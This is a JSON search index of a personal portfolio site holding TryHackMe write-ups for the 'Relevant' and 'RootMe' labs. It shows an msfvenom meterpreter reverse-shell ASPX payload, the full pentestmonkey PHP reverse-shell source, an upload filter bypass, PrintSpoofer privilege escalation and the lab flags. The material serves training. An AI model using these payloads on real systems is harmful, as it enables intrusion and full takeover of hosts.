[
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "M. Murat Ardag, Ph.D.",
    "section": "",
    "text": "I completed IronHack’s Cybersecurity Bootcamp, and am currently studying for the CompTIA Security+ (SY0-701) certification. In addition, I finished the Pre-Security, Cybersecurity 101, Web Fundamentals, Jr Penetration Tester, Security Engineer, and DevSecOps paths on TryHackMe and am advancing through the Penetration Tester and Cloud Security paths."
  },
  {
    "objectID": "md/THM/THM_relevant.html#penetration-testing-challenge",
    "href": "md/THM/THM_relevant.html#penetration-testing-challenge",
    "title": "Relevant",
    "section": "Penetration Testing Challenge",
    "text": "Penetration Testing Challenge\nThis exercise is designed to simulate authentic penetration testing scenarios and prepare practitioners for professional certifications.\n\nPre-Engagement Briefing\n\nObjective\nConduct a penetration test on an environment scheduled for production release in 7 days, simulating a malicious actor’s perspective with minimal prior knowledge.\n\n\nPrimary Goals\nLocate and capture two flags as proof of exploitation User.txt Root.txt\n\n\nScope & Rules\nTarget: Only the assigned IP address is in scope Approach: Black box testing (minimal information provided) Tools: Any tools/techniques permitted Discovery: Find and document ALL vulnerabilities"
  },
  {
    "objectID": "md/THM/THM_relevant.html#answer-the-questions-below",
    "href": "md/THM/THM_relevant.html#answer-the-questions-below",
    "title": "Relevant",
    "section": "#### Answer the questions below",
    "text": "#### Answer the questions below\nQ: User Flag\nA:\nTHM{fdk4ka34vk346ksxfr21tg789ktf45}\nQ: Root Flag\nA:\nTHM{1fk5kf469devly1gl320zafgl345pv}\nNo need for nmap to know that this is a Windows Server.\n\nGOOD PRACTICE: Splitting the terminal or having multiple terminal tabs open enables good navigation & orientation.\nScanning with nmap reveals valuable information, preventing many potential frustrations down the road.\nroot@ip-10-10-99-136:~# nmap -p- -sC -sV 10.10.172.27\nStarting Nmap 7.80 ( https://nmap.org ) at 2025-05-29 19:24 BST\nNmap scan report for 10.10.172.27\nHost is up (0.00033s latency).\nNot shown: 65526 filtered ports\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: RELEVANT\n|   NetBIOS_Domain_Name: RELEVANT\n|   NetBIOS_Computer_Name: RELEVANT\n|   DNS_Domain_Name: Relevant\n|   DNS_Computer_Name: Relevant\n|   Product_Version: 10.0.14393\n|_  System_Time: 2025-05-29T18:27:34+00:00\n| ssl-cert: Subject: commonName=Relevant\n| Not valid before: 2025-05-28T18:20:37\n|_Not valid after:  2025-11-27T18:20:37\n|_ssl-date: 2025-05-29T18:28:15+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49663/tcp open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 02:6F:51:08:98:D1 (Unknown)\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s\n|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:6f:51:08:98:d1 (unknown)\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: Relevant\n|   NetBIOS computer name: RELEVANT\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-05-29T11:27:34-07:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-05-29T18:27:35\n|_  start_date: 2025-05-29T18:20:37\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 200.31 seconds\nWhat jumps at you is the guest account access, suggesting anonymous/unauthenticated access might be possible to SMB shares.\nAnother thing to note is the multiple open tcp http ports, which will become relevant in delivering the exploit.\nsmbclient -L \\\\10.10.172.27\nPassword for [WORKGROUP\\root]:\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    nt4wrksv        Disk      \nSMB1 disabled -- no workgroup available\nroot@ip-10-10-99-136:~# smbclient //10.10.172.27/nt4wrksv//\nPassword for [WORKGROUP\\root]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Jul 25 22:46:04 2020\n  ..                                  D        0  Sat Jul 25 22:46:04 2020\n  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020\n\n        7735807 blocks of size 4096. 5126354 blocks available\nsmb: \\&gt; more passwords.txt\ngetting file \\passwords.txt of size 98 as /tmp/smbmore.u43vrO (31.9 KiloBytes/sec) (average 31.9 KiloBytes/sec)\n\nsmb: \\&gt; exit\nroot@ip-10-10-99-136:~# \nPasswords are encoded in Base64, which can be decoded using CyberChef or a similar tool.\nQm9iIC0gIVBAJCRXMHJEITEyMw==\nQmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\n\nBob - !P@$$W0rD!123\nBill - Juw4nnaM4n420696969!$$$\nUsing tools like smbmap might be helpful in other cases, but here it is a bit redundant since the anonymous access can also deliver the exploits. So the following can actually be skipped.\nPasswords lead to nowhere.\nroot@ip-10-10-99-136:~# smbmap -H 10.10.172.27 -u Bob -p '!P@$$W0rD!123'\n[+] Finding open SMB ports....\n[+] User SMB session established on 10.10.172.27...\n[+] IP: 10.10.172.27:445    Name: 10.10.172.27                                      \n    Disk                                                    Permissions Comment\n    ----                                                    ----------- -------\n    ADMIN$                                              NO ACCESS   Remote Admin\n    C$                                                  NO ACCESS   Default share\n    .                                                  \n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    InitShutdown\n    fr--r--r--                4 Sun Dec 31 23:58:45 1600    lsass\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    ntsvcs\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    scerpc\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-2ac-0\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    epmapper\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-1a0-0\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    LSM_API_service\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    eventlog\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-3cc-0\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    TermSrv_API_service\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    Ctx_WinStation_API_service\n    fr--r--r--                4 Sun Dec 31 23:58:45 1600    wkssvc\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    atsvc\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    SessEnvPublicRpc\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-348-0\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    trkwks\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    spoolss\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-5d4-0\n    fr--r--r--                3 Sun Dec 31 23:58:45 1600    W32TIME_ALT\n    fr--r--r--                4 Sun Dec 31 23:58:45 1600    srvsvc\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-220-0\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\\CatalogChangeListener-230-0\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    iisipm1bb87675-3872-4e14-ace3-a3a9a64df090\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Z7kP6yV1CB49BNpFATtkb0JNHt8EIhJcftQW4bUgxUWV7uzwlFLumWnafF8FGYv2Jgis4qQuy69zFTNgicBCHKcm7Il6UGvYoiXY3shmOZH7mxdEFuwsWI\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    CPFATP_3972_v4.0.30319\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    iisipmdb87032d-d651-43b1-a774-744338ee4267\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    Q3ZT4IIE0dmoiXMlzW8AnvZA2f3oKEBFz9QCFQl6PRQcbVYg5MJc9g5xXAahyNtONmcgyx15xTA8uax3JCbcEBzkEjqkJA1HfBIeJXMMQOWg99EM89pMKA\n    fr--r--r--                1 Sun Dec 31 23:58:45 1600    CPFATP_2288_v4.0.30319\n    IPC$                                                READ ONLY   Remote IPC\n    nt4wrksv                                            READ, WRITE \nroot@ip-10-10-99-136:~# \nLet’s have the relevant exploits ready.\nThe first one obtained from the GitHub repo is needed for privilege escalation once we are in. The second one, prepared with msfvenom opens the door.\nroot@ip-10-10-99-136:~# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe\n--2025-05-29 19:30:30--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe\nResolving github.com (github.com)... 4.208.26.197\nConnecting to github.com (github.com)|4.208.26.197|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLocation: https://objects.githubusercontent.com/github-production-release-asset-2e65be/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250529%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250529T183030Z&X-Amz-Expires=300&X-Amz-Signature=4707ec4ccbaf15050135e1f8b23c3983cbf8a1d7ef9a1ae4572ce0eb20dda1d2&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream [following]\n--2025-05-29 19:30:30--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250529%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250529T183030Z&X-Amz-Expires=300&X-Amz-Signature=4707ec4ccbaf15050135e1f8b23c3983cbf8a1d7ef9a1ae4572ce0eb20dda1d2&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream\nResolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...\nConnecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 27136 (26K) [application/octet-stream]\nSaving to: \\u2018PrintSpoofer64.exe\\u2019\n\nPrintSpoofer64.exe        100%[=====================================&gt;]  26.50K  --.-KB/s    in 0.001s  \n\n2025-05-29 19:30:30 (37.4 MB/s) - \\u2018PrintSpoofer64.exe\\u2019 saved [27136/27136]\n\nroot@ip-10-10-99-136:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.99.136 LPORT=8910 -f aspx -o shelly.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 203846 bytes\nFinal size of aspx file: 1030521 bytes\nSaved as: shelly.aspx\nroot@ip-10-10-99-136:~# \nOnce these are available on the attack box, return to the smbclient and push them both to the nt4wrksv folder.\nroot@ip-10-10-99-136:~# smbclient //10.10.172.27/nt4wrksv//\nPassword for [WORKGROUP\\root]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; put shelly.aspx\nputting file shelly.aspx as \\shelly.aspx (111817.5 kb/s) (average 111818.7 kb/s)\nsmb: \\&gt; put PrintSpoofer64.exe\nputting file PrintSpoofer64.exe as \\PrintSpoofer64.exe (563.8 kb/s) (average 18444.1 kb/s)\nsmb: \\&gt; ls\n  .                                   D        0  Thu May 29 19:47:47 2025\n  ..                                  D        0  Thu May 29 19:47:47 2025\n  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020\n  PrintSpoofer64.exe                  A    27136  Thu May 29 19:47:47 2025\n  shelly.aspx                         A  1030521  Thu May 29 19:47:24 2025\n\n        7735807 blocks of size 4096. 5136685 blocks available\nsmb: \\&gt; quit\nroot@ip-10-10-99-136:~# \nOnce the deliveries are placed, it is time to prep the Metasploit environment.\nroot@ip-10-10-99-136:~# msfconsole\nThis copy of metasploit-framework is more than two weeks old.\n Consider running 'msfupdate' to update to the latest version.\nMetasploit tip: View a module's description using info, or the enhanced \nversion in your browser with info -d\n                                                  \n\n      .:okOOOkdc'           'cdkOOOko:.\n    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.\n   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:\n  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'\n  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo\n  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx\n  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl\n  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.\n   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc\n    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo\n     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl\n      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;\n       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.\n         ,kOl'M.OOOOOOOOOOOOO.M'dOk,\n           :kk;.OOOOOOOOOOOOO.;Ok:\n             ;kOOOOOOOOOOOOOOOk:\n               ,xOOOOOOOOOOOx,\n                 .lOOOOOOOl.\n                    ,dOd,\n                      .\n\n       =[ metasploit v6.4.55-dev-                         ]\n+ -- --=[ 2502 exploits - 1287 auxiliary - 431 post       ]\n+ -- --=[ 1616 payloads - 49 encoders - 13 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 &gt; use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp\npayload =&gt; windows/x64/meterpreter_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set LHOST 10.10.99.136\nLHOST =&gt; 10.10.99.136\nmsf6 exploit(multi/handler) &gt; set LPORT 8910\nLPORT =&gt; 8910\nmsf6 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 10.10.99.136:8910 \nDuring many frustrating attempts, you will have discovered that the default tcp http port won’t work for the detonation; so utilize the other open port to detonate the shell.\nCan be done on the browser or with curl.\nroot@ip-10-10-99-136:~# curl 10.10.172.27:49663/nt4wrksv/shelly.aspx\nWe are now in, and Metasploit is now the meterpreter &gt;\nAll we need to do now is turn it into Shell and start traversing the directories to get to the .exe we pushed earlier.\nmsf6 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 10.10.99.136:8910 \n[*] Meterpreter session 1 opened (10.10.99.136:8910 -&gt; 10.10.172.27:49921) at 2025-05-29 19:56:58 +0100\n\nmeterpreter &gt; shell\nProcess 3800 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nc:\\windows\\system32\\inetsrv&gt;cd c:\\inetpub\ncd c:\\inetpub\n\nc:\\inetpub&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is AC3C-5CB5\n\n Directory of c:\\inetpub\n\n07/25/2020  08:16 AM    &lt;DIR&gt;          .\n07/25/2020  08:16 AM    &lt;DIR&gt;          ..\n07/25/2020  08:07 AM    &lt;DIR&gt;          history\n07/25/2020  08:05 AM    &lt;DIR&gt;          logs\n07/25/2020  08:05 AM    &lt;DIR&gt;          temp\n07/25/2020  02:46 PM    &lt;DIR&gt;          wwwroot\n07/25/2020  02:04 PM    &lt;DIR&gt;          wwwroot1\n               0 File(s)              0 bytes\n               7 Dir(s)  21,039,386,624 bytes free\n\nc:\\inetpub&gt;cd wwwroot\ncd wwwroot\n\nc:\\inetpub\\wwwroot&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is AC3C-5CB5\n\n Directory of c:\\inetpub\\wwwroot\n\n07/25/2020  02:46 PM    &lt;DIR&gt;          .\n07/25/2020  02:46 PM    &lt;DIR&gt;          ..\n07/25/2020  08:05 AM    &lt;DIR&gt;          aspnet_client\n07/25/2020  08:05 AM               703 iisstart.htm\n07/25/2020  08:05 AM            99,710 iisstart.png\n05/29/2025  11:47 AM    &lt;DIR&gt;          nt4wrksv\n               2 File(s)        100,413 bytes\n               4 Dir(s)  21,039,386,624 bytes free\n\nc:\\inetpub\\wwwroot&gt;cd nt4wrksv\ncd nt4wrksv\n\nc:\\inetpub\\wwwroot\\nt4wrksv&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is AC3C-5CB5\n\n Directory of c:\\inetpub\\wwwroot\\nt4wrksv\n\n05/29/2025  11:47 AM    &lt;DIR&gt;          .\n05/29/2025  11:47 AM    &lt;DIR&gt;          ..\n07/25/2020  08:15 AM                98 passwords.txt\n05/29/2025  11:47 AM            27,136 PrintSpoofer64.exe\n05/29/2025  11:47 AM         1,030,521 shelly.aspx\n               3 File(s)      1,057,755 bytes\n               2 Dir(s)  21,039,386,624 bytes free\n\nc:\\inetpub\\wwwroot\\nt4wrksv&gt;\nOnce we are at the location, we must execute the PrintSpoofer and convert ourselves to PowerShell to escalate the privilege. After that, it is a walk in the park.\nc:\\inetpub\\wwwroot\\nt4wrksv&gt;PrintSpoofer64.exe -i -c powershell.exe\nPrintSpoofer64.exe -i -c powershell.exe\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nWindows PowerShell \nCopyright (C) 2016 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32&gt; whoami\nwhoami\nnt authority\\system\nPS C:\\Windows\\system32&gt; cd c:\\users\ncd c:\\users\nPS C:\\users&gt; dir\ndir\n\n\n    Directory: C:\\users\n\n\nMode                LastWriteTime         Length Name                          \n----                -------------         ------ ----                          \nd-----        7/25/2020   8:05 AM                .NET v4.5                     \nd-----        7/25/2020   8:05 AM                .NET v4.5 Classic             \nd-----        7/25/2020  10:30 AM                Administrator                 \nd-----        7/25/2020   2:03 PM                Bob                           \nd-r---        7/25/2020   7:58 AM                Public                        \n\n\nPS C:\\users&gt; cd c:\\Users\\Administrator\\Desktop\nPS C:\\Users\\Administrator\\Desktop&gt; dir\ndir\n\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\n\nMode                LastWriteTime         Length Name                          \n----                -------------         ------ ----                          \n-a----        7/25/2020   8:25 AM             35 root.txt                      \n\n\nPS C:\\Users\\Administrator\\Desktop&gt; cat root.txt\ncat root.txt\nTHM{1fk5kf469devly1gl320zafgl345pv}\nPS C:\\Users\\Administrator\\Desktop&gt; cd C:\\Users\\Bob\\Desktop\ncd C:\\Users\\Bob\\Desktop\nPS C:\\Users\\Bob\\Desktop&gt; dir\ndir\n\n\n    Directory: C:\\Users\\Bob\\Desktop\n\n\nMode                LastWriteTime         Length Name                          \n----                -------------         ------ ----                          \n-a----        7/25/2020   8:24 AM             35 user.txt                      \n\n\nPS C:\\Users\\Bob\\Desktop&gt; cat user.txt\ncat user.txt\nTHM{fdk4ka34vk346ksxfr21tg789ktf45}\nPS C:\\Users\\Bob\\Desktop&gt; \nThis room is an excellent example of reconnaissance’s importance in pen-testing, which I completely skipped here. The hard lesson to learn in this room is to pay attention to the initial scan results and think before you act."
  },
  {
    "objectID": "md/THM/THM_rrootme.html#a-ctf-for-beginners-can-you-root-me",
    "href": "md/THM/THM_rrootme.html#a-ctf-for-beginners-can-you-root-me",
    "title": "RootMe",
    "section": "A ctf for beginners, can you root me?",
    "text": "A ctf for beginners, can you root me?\n\nReconnaissance\nFirst, let’s get information about the target."
  },
  {
    "objectID": "md/THM/THM_rrootme.html#answer-the-questions-below",
    "href": "md/THM/THM_rrootme.html#answer-the-questions-below",
    "title": "RootMe",
    "section": "#### Answer the questions below",
    "text": "#### Answer the questions below\nQ: Scan the machine, how many ports are open?\nnmap -p- -sC -sV &lt;target_machine_ip&gt;\nStarting Nmap 7.80 ( https://nmap.org ) at 2025-05-28 16:17 BST\nNmap scan report for &lt;target_machine_ip&gt;\nHost is up (0.00020s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)\n|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)\n|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: HackIT - Home\nMAC Address: 02:83:0F:68:46:09 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.18 seconds\nA:\n2\nQ: What version of Apache is running? Has been answered already with the previous. A\n2.4.29\nQ: What service is running on port 22? Has been answered already with the previous.\nssh\nQ: Find directories on the web server using the GoBuster tool.\nA:\nNo answer needed\ngobuster dir -u &lt;target_machine_ip&gt; -w /usr/share/wordlists/dirb/common.txt -t 32 -o gobuster_results.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     &lt;target_machine_ip&gt;\n[+] Method:                  GET\n[+] Threads:                 32\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.htpasswd            (Status: 403) [Size: 278]\n/css                  (Status: 301) [Size: 312] [--&gt; &lt;target_machine_ip&gt;/css/]\n/.htaccess            (Status: 403) [Size: 278]\n/.hta                 (Status: 403) [Size: 278]\n/index.php            (Status: 200) [Size: 616]\n/js                   (Status: 301) [Size: 311] [--&gt; &lt;target_machine_ip&gt;/js/]\n/panel                (Status: 301) [Size: 314] [--&gt; &lt;target_machine_ip&gt;/panel/]\n/server-status        (Status: 403) [Size: 278]\n/uploads              (Status: 301) [Size: 316] [--&gt; &lt;target_machine_ip&gt;/uploads/]\nProgress: 4614 / 4615 (99.98%)\n===============================================================\nFinished\n===============================================================\nQ: What is the hidden directory? A:\n/panel/\n\nGetting a shell\nFind a form to upload and get a reverse shell, and find the flag."
  },
  {
    "objectID": "md/THM/THM_rrootme.html#answer-the-questions-below-1",
    "href": "md/THM/THM_rrootme.html#answer-the-questions-below-1",
    "title": "RootMe",
    "section": "#### Answer the questions below",
    "text": "#### Answer the questions below\nQ: user.txt\n\nStep 1: Go to the server and get unimpressed\n\n\n\nStep 2: Go to /panel/\n\n\n\nStep 3.1.: Go to Reverse Shell Generator to prep webshell\nStep 3.2.: prep shelly.php\n\n//&lt;?php\n// // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// // Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n// \n// set_time_limit (0);\n// $VERSION = \"1.0\";\n// $ip = '&lt;attack_box_ip&gt;';\n// $port = &lt;port&gt;;\n// $chunk_size = 1400;\n// $write_a = null;\n// $error_a = null;\n// $shell = 'uname -a; w; id; sh -i';\n// $daemon = 0;\n// $debug = 0;\n// \n// if (function_exists('pcntl_fork')) {\n//  $pid = pcntl_fork();\n//  \n//  if ($pid == -1) {\n//      printit(\"ERROR: Can't fork\");\n//      exit(1);\n//  }\n//  \n//  if ($pid) {\n//      exit(0);  // Parent exits\n//  }\n//  if (posix_setsid() == -1) {\n//      printit(\"Error: Can't setsid()\");\n//      exit(1);\n//  }\n// \n//  $daemon = 1;\n// } else {\n//  printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n// }\n// \n// chdir(\"/\");\n// \n// umask(0);\n// \n// // Open reverse connection\n// $sock = fsockopen($ip, $port, $errno, $errstr, 30);\n// if (!$sock) {\n//  printit(\"$errstr ($errno)\");\n//  exit(1);\n// }\n// \n// $descriptorspec = array(\n//    0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n//    1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n//    2 =&gt; array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n// );\n// \n// $process = proc_open($shell, $descriptorspec, $pipes);\n// \n// if (!is_resource($process)) {\n//  printit(\"ERROR: Can't spawn shell\");\n//  exit(1);\n// }\n// \n// stream_set_blocking($pipes[0], 0);\n// stream_set_blocking($pipes[1], 0);\n// stream_set_blocking($pipes[2], 0);\n// stream_set_blocking($sock, 0);\n// \n// printit(\"Successfully opened reverse shell to $ip:$port\");\n// \n// while (1) {\n//  if (feof($sock)) {\n//      printit(\"ERROR: Shell connection terminated\");\n//      break;\n//  }\n// \n//  if (feof($pipes[1])) {\n//      printit(\"ERROR: Shell process terminated\");\n//      break;\n//  }\n// \n//  $read_a = array($sock, $pipes[1], $pipes[2]);\n//  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n// \n//  if (in_array($sock, $read_a)) {\n//      if ($debug) printit(\"SOCK READ\");\n//      $input = fread($sock, $chunk_size);\n//      if ($debug) printit(\"SOCK: $input\");\n//      fwrite($pipes[0], $input);\n//  }\n// \n//  if (in_array($pipes[1], $read_a)) {\n//      if ($debug) printit(\"STDOUT READ\");\n//      $input = fread($pipes[1], $chunk_size);\n//      if ($debug) printit(\"STDOUT: $input\");\n//      fwrite($sock, $input);\n//  }\n// \n//  if (in_array($pipes[2], $read_a)) {\n//      if ($debug) printit(\"STDERR READ\");\n//      $input = fread($pipes[2], $chunk_size);\n//      if ($debug) printit(\"STDERR: $input\");\n//      fwrite($sock, $input);\n//  }\n// }\n// \n// fclose($sock);\n// fclose($pipes[0]);\n// fclose($pipes[1]);\n// fclose($pipes[2]);\n// proc_close($process);\n// \n// function printit ($string) {\n//  if (!$daemon) {\n//      print \"$string\\n\";\n//  }\n// }\n// \n//?&gt;\nStep 3.3.: Server does not fancy shelly.php\n\nStep 3.4.: Server is OK with shelly.phtml\n\nStep 3.5.: shelly.phtml now waits at /uploads to be executed\nStep 3.6.: set up the listener\nnc -nlvp &lt;port&gt;\nStep 3.7.1.: after shelly.phtml opens the door, get in politely … Step 3.7.2.: … ask the existential question first, and then kindly ask the other questions …\nroot@ip&lt;attack_box&gt;:~# nc -nlvp &lt;port&gt;\nListening on 0.0.0.0 &lt;port&gt;\nConnection received on &lt;target_ip&gt; 32788\nLinux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 16:13:07 up  1:01,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nsh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n$ pwd \n/\n$ find -name user.txt 2&gt;/dev/null\n./var/www/user.txt\n$ cat /var/www/user.txt\n… and get the answer\nA:\nTHM{y0u_g0t_a_sh3ll}\n\nPrivilege escalation\nNow that we have a shell, let’s escalate our privileges to root. #### Answer the questions below —\nQ: Search for files with SUID permission, which file is weird?\nGet an old friend’s help for upward social mobility …\n$ which python\n/usr/bin/python\n$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\nbash-4.4$\nbash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null\nfind / -perm -4000 -type f 